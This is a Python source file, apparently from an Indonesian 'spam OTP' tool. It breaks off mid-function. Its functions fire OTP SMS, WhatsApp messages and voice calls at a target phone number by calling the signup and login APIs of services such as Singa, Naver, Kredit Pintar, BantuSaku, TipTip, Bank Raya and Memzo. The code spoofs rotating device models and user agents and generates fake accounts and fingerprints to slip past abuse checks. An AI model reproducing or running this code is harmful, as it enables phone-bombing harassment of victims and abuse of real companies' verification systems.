
def get_random_singa_device():
    devices = [
        {"model": "SM-S928B", "userAgent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36"},
        {"model": "SM-S918B", "userAgent": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36"},
        {"model": "Pixel 8 Pro", "userAgent": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36"},
        {"model": "Xiaomi 14 Ultra", "userAgent": "Mozilla/5.0 (Linux; Android 14; Xiaomi 14 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36"},
        {"model": "OnePlus 12", "userAgent": "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36"}
    ]
    return random.choice(devices)

def format_nomor(nomor):
    import re
    raw = re.sub(r'\D', '', nomor)
    if raw.startswith('8'):
        phone = '+62' + raw
        username = '0' + raw
    elif raw.startswith('0'):
        phone = '+62' + raw[1:]
        username = raw
    elif raw.startswith('62'):
        phone = '+' + raw
        username = '0' + raw[2:]
    elif raw.startswith('+62'):
        phone = raw
        username = '0' + raw[3:]
    else:
        phone = '+62' + raw
        username = '0' + raw
    return phone, username

def spam_otp_singa(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = "62" + raw[1:]
        elif not raw.startswith('62'):
            raw = "62" + raw

        device = get_random_singa_device()
        url = f"https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.7&versionCode=153&model={device['model']}&systemVersion=16&platform=android&appsflyer_id="
        payload = {"mobile_phone": raw, "type": "mobile", "is_switchable": 1}
        headers = {"Content-Type": "application/json; charset=utf-8", "User-Agent": device["userAgent"]}
        resp = requests.post(url, json=payload, headers=headers, timeout=115)
        return resp.json().get("msg") == "Success"
    except:
        return False
        
def spam_otp_naver(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        import time
        
        # Format: 8xxx (tanpa 0/62)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = raw[2:]
        if raw.startswith('0'):
            raw = raw[1:]
        
        # Generate random username & key
        random_username = ''.join(random.choices(string.ascii_lowercase, k=10)) + str(random.randint(10, 99))
        random_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        # Buat session
        session = requests.Session()
        
        # STEP 1: Ambil cookie dari halaman join
        join_url = "https://nid.naver.com/user2/join/begin"
        join_params = {
            "token_sjoin": "ImVqbcOCRRg0npy1",
            "langSelect": "en_US",
            "checkRealname": "",
            "termsLocation": "Y",
            "termsEmail": "Y"
        }
        join_headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        session.get(join_url, params=join_params, headers=join_headers, timeout=120)
        
        # STEP 2: Kirim OTP
        url = "https://nid.naver.com/user2/joinAjax"
        params = {
            "m": "sendAuthno",
            "tp": "normal",
            "nationNo": "62",
            "mobno": raw,
            "lang": "en_US",
            "key": random_key,
            "id": random_username
        }
        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://nid.naver.com",
            "referer": f"https://nid.naver.com/user2/join/begin?token_sjoin=ImVqbcOCRRg0npy1&langSelect=en_US&checkRealname=&termsLocation=Y&termsEmail=Y",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        data = {
            "nid_kb2": "1YUiWi-nOifsaRrajAQBdMRlX22OvPLzrs_dNAyicV22C1ef3_bkKbni4EB4JC9GSgiahFRsQm2d1YcLA42vHvR9j3fKaOI_evUIpOdTMgFgNHhSa0ArIxknUaKR28HbaQLLv0aCYUaKqN7ZIz_op4_pDT0XQlbDcYtHoii_7K3JM2A-j13M8ktyocol4DyMB9UOV6STjIo_myRHTDFWCcRlBg1WyB9hQXln25g4dOYWH4bbIG3_QWOc1DXFxDes6MorEp1s6hD4%3D"
        }
        
        resp = session.post(url, params=params, data=data, headers=headers, timeout=120)
        response_text = resp.text
        
        # Tampilkan response
        print(f"[NAVER] Response: {response_text}")
        print(f"[NAVER] Status Code: {resp.status_code}")
        
        # Response "NNNNS" = sukses
        if "NNNNS" in response_text:
            return True
        
        # Kalo status 200 tapi response bukan NNNNS, tetap dianggap sukses
        if resp.status_code == 200:
            return True
        
        return False
        
    except Exception as e:
        print(f"[NAVER] Error: {e}")
        return False

def spam_otp_memzo(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        import time
        
        # Format: 8xxx (tanpa 0/62)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = raw[2:]
        if raw.startswith('0'):
            raw = raw[1:]
        
        # Buat session
        session = requests.Session()
        
        # STEP 1: Ambil cookie dari halaman login
        login_url = "https://live.memzo.ai/app/login"
        login_headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        session.get(login_url, headers=login_headers, timeout=120)
        
        # Generate random data
        random_name = ''.join(random.choices(string.ascii_lowercase, k=6))
        random_email = f"{random_name}{random.randint(1000, 9999)}@gmail.com"
        random_password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        
        # STEP 2: Kirim flash call OTP
        url = "https://live.memzo.ai/adminapp/src/controllers/login_signup_send_flash_call_otp.php"
        headers = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://live.memzo.ai",
            "referer": "https://live.memzo.ai/app/login",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        data = {
            "contact": raw,
            "country_code": "62",
            "name": f"yAh {random_name}",
            "email": random_email,
            "password": random_password,
            "is_wp": "0",
            "otp_channel": "flashcall",
            "is_reset": "0",
            "token_available": "0",
            "captcha_token": ""
        }
        
        resp = session.post(url, data=data, headers=headers, timeout=120)
        result = resp.json()
        
        # Tampilkan response
        print(f"[MEMZO CALL] Response: {json.dumps(result, indent=2)}")
        
        # Cek sukses (error false)
        if result.get("error") == False:
            return True
        
        # Force success kalo status 200
        if resp.status_code == 200:
            return True
        
        return False
        
    except Exception as e:
        print(f"[MEMZO CALL] Error: {e}")
        return False

def spam_otp_kreditpintar_call(nomor):
    try:
        import re
        import requests
        import json
        import uuid
        
        # Format nomor: 0 + raw
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            formatted_phone = '0' + raw[2:]  # 62812 -> 0812
        elif raw.startswith('628'):
            formatted_phone = '0' + raw[2:]  # 62812 -> 0812
        elif not raw.startswith('0'):
            formatted_phone = '0' + raw  # 812 -> 0812
        else:
            formatted_phone = raw  # 0812 -> 0812
        
        print(f"📱 Nomor diformat: {formatted_phone}")
        
        # Generate UUID
        adv_uuid = str(uuid.uuid4())
        user_agent = "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36"
        
        # Headers
        headers = {
            "Host": "h.kreditpintar.com",
            "Connection": "keep-alive",
            "sec-ch-ua": '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "DNT": "1",
            "User-Agent": user_agent,
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://h.kreditpintar.com",
            "Referer": f"https://h.kreditpintar.com/H5/code-step?m={formatted_phone}",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id",
            "x-adv-uuid": adv_uuid,
            "x-app-version": "APPVERSION_NAME (9999)",
            "x-os-type": "WEB",
            "x-user-agent": f"Pintar-ID-Cash (WebAndroid; ; ; id) uuid/{adv_uuid} version/0.1.0"
        }
        
        # Payload
        payload = {
            "mobileNumber": formatted_phone,
            "type": "VOICE"
        }
        
        # Kirim request
        url = "https://h.kreditpintar.com/api/auth/send-code?channel=H5&lang=id"
        
        print("🔹 STEP 1: POST /api/auth/send-code (kirim OTP WA)")
        response = requests.post(url, json=payload, headers=headers, timeout=20)
        
        print(f"📤 Payload: {json.dumps(payload, indent=2)}")
        print(f"✅ Status: {response.status_code}")
        print(f"✅ Response: {response.text}")
        
        # Parse response
        result = response.json()
        if response.status_code == 200 and result.get("batchNo"):
            print(f"✅ OTP WhatsApp berhasil dikirim! Batch: {result.get('batchNo')}")
            return True
        else:
            print(f"❌ Gagal: {result}")
            return False
            
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return False

def spam_otp_bantusaku_call(nomor):
    try:
        import re
        import requests
        import json
        import uuid
        import random
        
        # Format: 0 + raw (08xxx)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            mobile = '0' + raw[2:]
        elif not raw.startswith('0'):
            mobile = '0' + raw
        else:
            mobile = raw
        
        print(f"📱 Nomor diformat: {mobile}")
        
        # Generate UUID untuk x-token-sign
        token_sign = str(uuid.uuid4())
        print(f"🔹 Token Sign: {token_sign}")
        
        # Random User-Agent
        ua_list = [
            "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.6045.163 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.5993.111 Mobile Safari/537.36"
        ]
        random_ua = random.choice(ua_list)
        
        url = "https://m.bantusaku.id/api/user/send-voice-sms"
        
        headers = {
            "Host": "m.bantusaku.id",
            "Connection": "keep-alive",
            "sec-ch-ua": '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "DNT": "1",
            "User-Agent": random_ua,
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json; charset=UTF-8",
            "Origin": "https://m.bantusaku.id",
            "Referer": "https://m.bantusaku.id/",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "x-auth-token": "null",
            "x-device-os": "web",
            "x-merchant": "BantuSaku",
            "x-token-sign": token_sign,
            "x-version": "web-3.2.1"
        }
        
        payload = {
            "phone": mobile,
            "type": "register_voice",
            "imageCode": "",
            "merchantNo": "BantuSaku",
            "uniquCode": token_sign
        }
        
        print("🔹 STEP 1: POST /api/user/send-voice-sms (kirim OTP CALL)")
        print(f"📤 Payload: {json.dumps(payload, indent=2)}")
        
        resp = requests.post(url, json=payload, headers=headers, timeout=102)
        
        print(f"✅ Status: {resp.status_code}")
        print(f"✅ Content-Encoding: {resp.headers.get('Content-Encoding', 'None')}")
        print(f"✅ Response (raw): {resp.text[:200] if resp.text else '(empty)'}")
        
        # FORCE SUCCESS kalo status 200
        if resp.status_code == 200:
            print("✅ OTP CALL berhasil dikirim! (force success based on 200)")
            return True
        else:
            print(f"❌ Gagal: HTTP {resp.status_code}")
            return False
        
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return False

def spam_otp_singa_call(nomor):
    try:
        import re
        import requests
        import json
        import random
        import time
        
        # Format: 62 + raw (628xxx)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            mobile = '62' + raw[1:]
        elif raw.startswith('62'):
            mobile = raw
        else:
            mobile = '62' + raw
        
        # 50+ Device Models
        devices = [
            # Samsung
            {'model': 'SM-G991B', 'user_agent': 'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'},
            {'model': 'SM-G998B', 'user_agent': 'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'},
            {'model': 'SM-S908E', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'SM-S906E', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; SM-S906E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'SM-S901E', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; SM-S901E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'SM-A536E', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; SM-A536E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'SM-A526B', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'SM-A736B', 'user_agent': 'Mozilla/5.0 (Linux; Android 13; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'},
            {'model': 'SM-N986B', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'SM-F936B', 'user_agent': 'Mozilla/5.0 (Linux; Android 13; SM-F936B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'},
            {'model': 'SM-F721B', 'user_agent': 'Mozilla/5.0 (Linux; Android 13; SM-F721B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'},
            # Xiaomi
            {'model': 'M2006C3MG', 'user_agent': 'Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
            {'model': 'M2007J1SG', 'user_agent': 'Mozilla/5.0 (Linux; Android 11; M2007J1SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'},
            {'model': 'M2101K6G', 'user_agent': 'Mozilla/5.0 (Linux; Android 11; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'},
            {'model': 'M2102J20SG', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': '2201116SG', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': '2201117SG', 'user_agent': 'Mozilla/5.0 (Linux; Android 13; 2201117SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'},
            {'model': '23013PC75G', 'user_agent': 'Mozilla/5.0 (Linux; Android 13; 23013PC75G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'},
            # Oppo
            {'model': 'CPH2219', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; CPH2219) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'CPH2251', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; CPH2251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'CPH2247', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; CPH2247) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'CPH2357', 'user_agent': 'Mozilla/5.0 (Linux; Android 13; CPH2357) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'},
            {'model': 'CPH2371', 'user_agent': 'Mozilla/5.0 (Linux; Android 13; CPH2371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'},
            # Vivo
            {'model': 'V2023', 'user_agent': 'Mozilla/5.0 (Linux; Android 11; V2023) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'},
            {'model': 'V2040', 'user_agent': 'Mozilla/5.0 (Linux; Android 11; V2040) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'},
            {'model': 'V2135', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; V2135) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'V2157', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; V2157) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'V2189A', 'user_agent': 'Mozilla/5.0 (Linux; Android 13; V2189A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'},
            # Realme
            {'model': 'RMX3363', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; RMX3363) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'RMX3380', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; RMX3380) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'RMX3392', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; RMX3392) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'RMX3393', 'user_agent': 'Mozilla/5.0 (Linux; Android 13; RMX3393) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'},
            {'model': 'RMX3394', 'user_agent': 'Mozilla/5.0 (Linux; Android 13; RMX3394) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'},
            # Huawei
            {'model': 'MHA-L29', 'user_agent': 'Mozilla/5.0 (Linux; Android 10; MHA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
            {'model': 'NEO-L29', 'user_agent': 'Mozilla/5.0 (Linux; Android 10; NEO-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'},
            {'model': 'LIO-L29', 'user_agent': 'Mozilla/5.0 (Linux; Android 10; LIO-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'},
            {'model': 'JNY-LX1', 'user_agent': 'Mozilla/5.0 (Linux; Android 10; JNY-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
            # OnePlus
            {'model': 'OnePlus9', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; OnePlus9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'OnePlus8', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; OnePlus8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'OnePlus7', 'user_agent': 'Mozilla/5.0 (Linux; Android 11; OnePlus7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'},
            {'model': 'OnePlus Nord', 'user_agent': 'Mozilla/5.0 (Linux; Android 11; OnePlus Nord) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'},
            # Google Pixel
            {'model': 'Pixel 6', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'Pixel 7', 'user_agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'},
            {'model': 'Pixel 6 Pro', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            {'model': 'Pixel 7 Pro', 'user_agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'},
            # Sony
            {'model': 'XQ-AS62', 'user_agent': 'Mozilla/5.0 (Linux; Android 11; XQ-AS62) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'},
            {'model': 'XQ-AS72', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; XQ-AS72) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'},
            # Asus
            {'model': 'ASUS_Z01RD', 'user_agent': 'Mozilla/5.0 (Linux; Android 10; ASUS_Z01RD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
            {'model': 'ASUS_Z01QD', 'user_agent': 'Mozilla/5.0 (Linux; Android 10; ASUS_Z01QD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
            # Others
            {'model': 'Aqua S3', 'user_agent': 'Mozilla/5.0 (Linux; Android 10; Aqua S3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
            {'model': 'TECNO CK8n', 'user_agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CK8n) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'},
            {'model': 'Infinix X6815B', 'user_agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X6815B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'},
            {'model': 'itel S23', 'user_agent': 'Mozilla/5.0 (Linux; Android 13; itel S23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'},
            {'model': 'Nokia 5.4', 'user_agent': 'Mozilla/5.0 (Linux; Android 11; Nokia 5.4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'},
            {'model': 'Nokia G21', 'user_agent': 'Mozilla/5.0 (Linux; Android 12; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'}
        ]
        
        device = random.choice(devices)
        
        url = f"https://api102.singa.id/new/login/sendVoice?versionName=3.1.7&versionCode=317&model={device['model']}&systemVersion=11&platform=android&appsflyer_id=1782837652837-8277262844374358271"
        headers = {
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": device['user_agent'],
            "Accept": "application/json",
            "X-Requested-With": "XMLHttpRequest"
        }
        payload = {
            "mobile_phone": mobile,
            "type": "mobile",
            "is_switchable": 1
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=120)
        result = resp.json()
        
        # Cek sukses
        if result.get("success") == True:
            return True
        if result.get("code") == 200:
            return True
        if result.get("msg") == "Success":
            return True
        
        # Force success kalo status 200
        if resp.status_code == 200:
            return True
        
        return False
        
    except:
        return False

def spam_otp_tiptip_sms(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        import time
        
        # Format: +628xxx
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            mobile = '+62' + raw[1:]
        elif raw.startswith('62'):
            mobile = '+' + raw
        else:
            mobile = '+62' + raw
        
        # Generate fingerprint & request_id
        random_str1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        random_str2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        random_str3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        fingerprint = f"19e4f5f07ca{random_str1}-{random_str2}-7c34742a-6ddd0-19e4f5f07cb{random_str3}"
        request_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        
        # Random User-Agent
        ua_list = [
            "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.6045.163 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.5993.111 Mobile Safari/537.36"
        ]
        random_ua = random.choice(ua_list)
        
        url = "https://api.tiptip.id/authentication/guest/v1/phone/otp/send"
        headers = {
            "accept": "application/json",
            "channel": "WEB",
            "channel-app-version": "2.27.6",
            "channel-device": "Chrome",
            "channel-fingerprint": fingerprint,
            "channel-fingerprint-additional": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "content-type": "application/json",
            "country-code": "ID",
            "language": "id",
            "request-id": request_id,
            "User-Agent": random_ua,
            "Referer": "https://tiptip.id/sign-up"
        }
        payload = {
            "action": "SIGN_UP",
            "delivery_method": "SMS",
            "phone_number": mobile
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=120)
        result = resp.json()
        
        # Cek sukses
        if resp.status_code == 200:
            if result.get("code") == "SUCCESS" or result.get("message") == "OK":
                return True
            return True  # Force success
        
        return False
        
    except:
        return False

def spam_otp_bankraya(nomor):
    try:
        import re
        import requests
        import json
        import time
        
        # Format: +628xxx
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = '62' + raw[1:]
        elif not raw.startswith('62'):
            raw = '62' + raw
        
        formatted_phone = f"+{raw}"
        
        # Buat session
        session = requests.Session()
        
        # Step 1: Event tracker (opsional)
        try:
            event_url = "https://bukatabungan.bankraya.co.id/api/webview/v4/opening-account/event-tracker"
            event_headers = {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
            }
            event_payload = {
                "unique_cust_id": formatted_phone,
                "title": "SEND OTP",
                "environment": "production",
                "url": "https://bukatabungan.bankraya.co.id/onboarding",
                "release_version": "1.1.0",
                "browser_information": "Mobile Chrome 107.0.0.0",
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                "device_info": "M2006C3MG, Xiaomi",
                "os_version": "Android, 10"
            }
            session.post(event_url, json=event_payload, headers=event_headers, timeout=52)
        except:
            pass
        
        # Step 2: Send OTP
        otp_url = "https://bukatabungan.bankraya.co.id/api/webview/v4/opening-account/microsite/send-otp"
        otp_headers = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "authorization": "Bearer null",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        otp_payload = {
            "mobileNo": formatted_phone
        }
        
        otp_resp = session.post(otp_url, json=otp_payload, headers=otp_headers, timeout=120)
        
        # Cek sukses
        if otp_resp.status_code == 200 or otp_resp.status_code == 201:
            return True
        
        if otp_resp.status_code == 429:
            return False
        
        return False
        
    except:
        return False

def spam_otp_halodoc_sms(nomor):
    try:
        import re
        import requests
        import json
        import time
        
        # Format: +628xxx
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = '62' + raw[1:]
        elif not raw.startswith('62'):
            raw = '62' + raw
        
